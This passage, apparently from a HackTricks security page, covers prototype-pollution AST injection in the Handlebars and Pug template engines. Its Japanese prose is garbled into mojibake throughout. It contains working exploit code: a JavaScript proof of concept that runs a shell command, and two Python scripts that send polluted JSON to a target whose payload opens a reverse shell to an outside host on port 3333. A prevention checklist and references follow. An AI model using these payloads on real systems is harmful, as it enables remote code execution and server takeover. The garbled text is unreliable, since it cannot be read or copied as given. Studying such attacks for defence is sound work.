1. **ãƒ‘ãƒ¼ã‚µãƒ¼ã®æ“ä½œ**: æœ€åˆã«ã€`NumberLiteral`ãƒãƒ¼ãƒ‰ã‚’ä»‹ã—ã¦ãƒ‘ãƒ¼ã‚µãƒ¼ã¯å€¤ãŒæ•°å€¤ã§ã‚ã‚‹ã“ã¨ã‚’å¼·åˆ¶ã—ã¾ã™ã€‚ãƒ—ãƒ­ãƒˆã‚¿ã‚¤ãƒ—æ±šæŸ“ã¯ã“ã‚Œã‚’å›é¿ã§ãã€éæ•°å€¤ã®æ–‡å­—åˆ—ã‚’æŒ¿å…¥ã™ã‚‹ã“ã¨ãŒå¯èƒ½ã«ãªã‚Šã¾ã™ã€‚
2. **ã‚³ãƒ³ãƒ‘ã‚¤ãƒ©ã«ã‚ˆã‚‹å‡¦ç†**: ã‚³ãƒ³ãƒ‘ã‚¤ãƒ©ã¯ASTã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã¾ãŸã¯æ–‡å­—åˆ—ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆã‚’å‡¦ç†ã§ãã¾ã™ã€‚`input.type`ãŒ`Program`ã«ç­‰ã—ã„å ´åˆã€å…¥åŠ›ã¯äº‹å‰ã«è§£æã•ã‚ŒãŸã‚‚ã®ã¨ã—ã¦æ‰±ã‚ã‚Œã€ã“ã‚Œã‚’æ‚ªç”¨ã§ãã¾ã™ã€‚
3. **ã‚³ãƒ¼ãƒ‰ã®æ³¨å…¥**: `Object.prototype`ã®æ“ä½œã‚’é€šã˜ã¦ã€ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆé–¢æ•°ã«ä»»æ„ã®ã‚³ãƒ¼ãƒ‰ã‚’æ³¨å…¥ã§ãã€ãƒªãƒ¢ãƒ¼ãƒˆã‚³ãƒ¼ãƒ‰å®Ÿè¡Œã«ã¤ãªãŒã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚

Handlebarsã®è„†å¼±æ€§ã‚’æ‚ªç”¨ã™ã‚‹ä¾‹ï¼š
```javascript
const Handlebars = require('handlebars');

Object.prototype.type = 'Program';
Object.prototype.body = [{
"type": "MustacheStatement",
"path": 0,
"params": [{
"type": "NumberLiteral",
"value": "console.log(process.mainModule.require('child_process').execSync('id').toString())"
}],
"loc": {
"start": 0,
"end": 0
}
}];

const source = `Hello {{ msg }}`;
const template = Handlebars.precompile(source);

console.log(eval('(' + template + ')')['main'].toString());
```
ã“ã®ã‚³ãƒ¼ãƒ‰ã¯ã€æ”»æ’ƒè€…ãŒHandlebarsãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆã«ä»»æ„ã®ã‚³ãƒ¼ãƒ‰ã‚’æ³¨å…¥ã™ã‚‹æ–¹æ³•ã‚’ç¤ºã—ã¦ã„ã¾ã™ã€‚

**å¤–éƒ¨å‚ç…§**: ãƒ—ãƒ­ãƒˆã‚¿ã‚¤ãƒ—æ±šæŸ“ã«é–¢é€£ã™ã‚‹å•é¡ŒãŒã€Œflatã€ãƒ©ã‚¤ãƒ–ãƒ©ãƒªã§è¦‹ã¤ã‹ã‚Šã¾ã—ãŸã€‚è©³ç´°ã¯ã“ã¡ã‚‰: [GitHubã®å•é¡Œ](https://github.com/hughsk/flat/issues/105)ã€‚

**å¤–éƒ¨å‚ç…§**: [ã€Œflatã€ãƒ©ã‚¤ãƒ–ãƒ©ãƒªã«ãŠã‘ã‚‹ãƒ—ãƒ­ãƒˆã‚¿ã‚¤ãƒ—æ±šæŸ“ã«é–¢é€£ã™ã‚‹å•é¡Œ](https://github.com/hughsk/flat/issues/105)

Pythonã«ãŠã‘ã‚‹ãƒ—ãƒ­ãƒˆã‚¿ã‚¤ãƒ—æ±šæŸ“ã®æ‚ªç”¨ã®ä¾‹:
```python
import requests

TARGET_URL = 'http://10.10.10.10:9090'

# make pollution
requests.post(TARGET_URL + '/vulnerable', json = {
"__proto__.type": "Program",
"__proto__.body": [{
"type": "MustacheStatement",
"path": 0,
"params": [{
"type": "NumberLiteral",
"value": "process.mainModule.require('child_process').execSync(`bash -c 'bash -i >& /dev/tcp/p6.is/3333 0>&1'`)"
}],
"loc": {
"start": 0,
"end": 0
}
}]
})

# execute
requests.get(TARGET_URL)
```
#### Pugã®è„†å¼±æ€§

Pugã¯ã€åˆ¥ã®ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆã‚¨ãƒ³ã‚¸ãƒ³ã§ã‚ã‚Šã€ãƒ—ãƒ­ãƒˆã‚¿ã‚¤ãƒ—æ±šæŸ“ã®åŒæ§˜ã®ãƒªã‚¹ã‚¯ã«ç›´é¢ã—ã¦ã„ã¾ã™ã€‚è©³ç´°ãªæƒ…å ±ã¯ã€[Pugã«ãŠã‘ã‚‹ASTã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ã®è­°è«–](https://blog.p6.is/AST-Injection/#Pug)ã§å…¥æ‰‹ã§ãã¾ã™ã€‚

Pugã«ãŠã‘ã‚‹ãƒ—ãƒ­ãƒˆã‚¿ã‚¤ãƒ—æ±šæŸ“ã®ä¾‹:
```python
import requests

TARGET_URL = 'http://10.10.10.10:9090'

# make pollution
requests.post(TARGET_URL + '/vulnerable', json = {
"__proto__.block": {
"type": "Text",
"line": "process.mainModule.require('child_process').execSync(`bash -c 'bash -i >& /dev/tcp/p6.is/3333 0>&1'`)"
}
})

# execute
requests.get(TARGET_URL)
```
### äºˆé˜²ç­–

ãƒ—ãƒ­ãƒˆã‚¿ã‚¤ãƒ—æ±šæŸ“ã®ãƒªã‚¹ã‚¯ã‚’æ¸›ã‚‰ã™ãŸã‚ã«ã€ä»¥ä¸‹ã®æˆ¦ç•¥ã‚’æ¡ç”¨ã§ãã¾ã™ï¼š

1. **ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã®ä¸å¤‰æ€§**: `Object.prototype`ã‚’`Object.freeze`ã‚’é©ç”¨ã™ã‚‹ã“ã¨ã§ä¸å¤‰ã«ã§ãã¾ã™ã€‚
2. **å…¥åŠ›æ¤œè¨¼**: JSONå…¥åŠ›ã¯ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã®ã‚¹ã‚­ãƒ¼ãƒã«å¯¾ã—ã¦å³å¯†ã«æ¤œè¨¼ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚
3. **å®‰å…¨ãªãƒãƒ¼ã‚¸é–¢æ•°**: å†å¸°çš„ãªãƒãƒ¼ã‚¸é–¢æ•°ã®å®‰å…¨ã§ãªã„ä½¿ç”¨ã¯é¿ã‘ã‚‹ã¹ãã§ã™ã€‚
4. **ãƒ—ãƒ­ãƒˆã‚¿ã‚¤ãƒ—ã®ãªã„ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆ**: ãƒ—ãƒ­ãƒˆã‚¿ã‚¤ãƒ—ãƒ—ãƒ­ãƒ‘ãƒ†ã‚£ã®ãªã„ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã¯`Object.create(null)`ã‚’ä½¿ç”¨ã—ã¦ä½œæˆã§ãã¾ã™ã€‚
5. **Mapã®ä½¿ç”¨**: ã‚­ãƒ¼ã¨å€¤ã®ãƒšã‚¢ã‚’ä¿å­˜ã™ã‚‹ãŸã‚ã«`Object`ã®ä»£ã‚ã‚Šã«`Map`ã‚’ä½¿ç”¨ã™ã¹ãã§ã™ã€‚
6. **ãƒ©ã‚¤ãƒ–ãƒ©ãƒªã®æ›´æ–°**: å®šæœŸçš„ã«ãƒ©ã‚¤ãƒ–ãƒ©ãƒªã‚’æ›´æ–°ã™ã‚‹ã“ã¨ã§ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ãƒ‘ãƒƒãƒã‚’çµ„ã¿è¾¼ã‚€ã“ã¨ãŒã§ãã¾ã™ã€‚
7. **ãƒªãƒ³ã‚¿ãƒ¼ã¨é™çš„è§£æãƒ„ãƒ¼ãƒ«**: ãƒ—ãƒ­ãƒˆã‚¿ã‚¤ãƒ—æ±šæŸ“ã®è„†å¼±æ€§ã‚’æ¤œå‡ºã—é˜²æ­¢ã™ã‚‹ãŸã‚ã«ã€é©åˆ‡ãªãƒ—ãƒ©ã‚°ã‚¤ãƒ³ã‚’æŒã¤ESLintãªã©ã®ãƒ„ãƒ¼ãƒ«ã‚’ä½¿ç”¨ã—ã¾ã™ã€‚
8. **ã‚³ãƒ¼ãƒ‰ãƒ¬ãƒ“ãƒ¥ãƒ¼**: ãƒ—ãƒ­ãƒˆã‚¿ã‚¤ãƒ—æ±šæŸ“ã«é–¢é€£ã™ã‚‹æ½œåœ¨çš„ãªãƒªã‚¹ã‚¯ã‚’ç‰¹å®šã—ä¿®æ­£ã™ã‚‹ãŸã‚ã«å¾¹åº•çš„ãªã‚³ãƒ¼ãƒ‰ãƒ¬ãƒ“ãƒ¥ãƒ¼ã‚’å®Ÿæ–½ã—ã¾ã™ã€‚
9. **ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ãƒˆãƒ¬ãƒ¼ãƒ‹ãƒ³ã‚°**: é–‹ç™ºè€…ã«ãƒ—ãƒ­ãƒˆã‚¿ã‚¤ãƒ—æ±šæŸ“ã®ãƒªã‚¹ã‚¯ã¨å®‰å…¨ãªã‚³ãƒ¼ãƒ‰ã‚’æ›¸ããŸã‚ã®ãƒ™ã‚¹ãƒˆãƒ—ãƒ©ã‚¯ãƒ†ã‚£ã‚¹ã«ã¤ã„ã¦æ•™è‚²ã—ã¾ã™ã€‚
10. **ãƒ©ã‚¤ãƒ–ãƒ©ãƒªã®ä½¿ç”¨ã«æ³¨æ„**: ã‚µãƒ¼ãƒ‰ãƒ‘ãƒ¼ãƒ†ã‚£ã®ãƒ©ã‚¤ãƒ–ãƒ©ãƒªã‚’ä½¿ç”¨ã™ã‚‹éš›ã¯æ³¨æ„ãŒå¿…è¦ã§ã™ã€‚ç‰¹ã«ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã‚’æ“ä½œã™ã‚‹ã‚‚ã®ã«ã¤ã„ã¦ã¯ã€ãã®ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£å§¿å‹¢ã‚’è©•ä¾¡ã—ã€ã‚³ãƒ¼ãƒ‰ã‚’ãƒ¬ãƒ“ãƒ¥ãƒ¼ã—ã¾ã™ã€‚
11. **ãƒ©ãƒ³ã‚¿ã‚¤ãƒ ä¿è­·**: ãƒ—ãƒ­ãƒˆã‚¿ã‚¤ãƒ—æ±šæŸ“æ”»æ’ƒã‚’æ¤œå‡ºã—é˜²æ­¢ã§ãã‚‹ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£é‡è¦–ã®npmãƒ‘ãƒƒã‚±ãƒ¼ã‚¸ã‚’ä½¿ç”¨ã™ã‚‹ãªã©ã€ãƒ©ãƒ³ã‚¿ã‚¤ãƒ ä¿è­·ãƒ¡ã‚«ãƒ‹ã‚ºãƒ ã‚’æ¡ç”¨ã—ã¾ã™ã€‚

## å‚è€ƒæ–‡çŒ®

* [https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/](https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/)
* [https://dev.to/caffiendkitten/prototype-inheritance-pollution-2o5l](https://dev.to/caffiendkitten/prototype-inheritance-pollution-2o5l)
* [https://itnext.io/prototype-pollution-attack-on-nodejs-applications-94a8582373e7](https://itnext.io/prototype-pollution-attack-on-nodejs-applications-94a8582373e7)
* [https://blog.p6.is/AST-Injection/](https://blog.p6.is/AST-Injection/)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
